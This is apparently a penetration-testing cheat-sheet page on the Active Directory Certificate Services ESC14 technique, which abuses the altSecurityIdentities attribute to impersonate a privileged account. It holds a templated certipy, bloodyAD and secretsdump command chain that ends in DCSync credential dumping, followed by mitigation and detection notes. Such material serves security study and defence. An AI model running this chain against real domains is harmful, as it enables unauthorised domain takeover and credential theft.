---
topic: AD CS — ESC14 and altSecurityIdentities
tags: [windows, active-directory, adcs, esc14, dcsync]
---

# AD CS — ESC14 and altSecurityIdentities

**English** | [🌐 Español](adcs-esc14.md)

## Concept

AD CS issues certificates for authentication. ESC14 abuses `altSecurityIdentities`: if an attacker can write that attribute on a privileged account, they can map a certificate they control to that account. Authenticating with the certificate makes the KDC treat them as the privileged user and enables DCSync.

## When it applies

- AD CS is deployed and a certificate can be requested.
- There are write permissions on `altSecurityIdentities` of a privileged account.
- The template allows client authentication.

## Procedure

1. Enumerate AD CS and templates with `certipy find`.
2. Identify an account with write rights over the attribute.
3. Request a certificate and write the matching `altSecurityIdentities`.
4. Authenticate with the certificate and run DCSync.

## Commands

```bash
certipy find -u <USER>@<DOMAIN> -p "<PASS>" -dc-ip <DC> -vulnerable
certipy req -u <USER>@<DOMAIN> -p "<PASS>" -ca <CA> -template <TEMPLATE>
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p "<PASS>" set object <TARGET> altSecurityIdentities -v "<CERTMAP>"
certipy auth -pfx <CERT>.pfx -dc-ip <DC>
secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC>
```

## Variants

- ESC14 A: write the attribute on the victim account.
- ESC14 B: issue the certificate with a controlled SAN.
- Combine with ESC1 when the template allows it.

## Limitations

- The attribute must match a format accepted by the KDC.
- An authentication template is required.
- Changes may be audited and reverted.

## Mitigation

- Restrict writes to `altSecurityIdentities`.
- Audit templates and the CA; harden AD CS.
- Monitor issued certificates and PKINIT authentications.

## Detection

- Changes to `altSecurityIdentities`.
- Certificates issued to privileged accounts.
- Kerberos authentication with unusual certificates.

## References

- [SpecterOps — ESC14](https://posts.specterops.io/adcs-esc14-abuse-14d1a58b8b5a)
- [0xdf — Scepter](https://0xdf.gitlab.io/2025/07/19/htb-scepter.html)
- [Microsoft — altSecurityIdentities](https://learn.microsoft.com/en-us/windows/win32/adschema/a-altsecurityidentities)
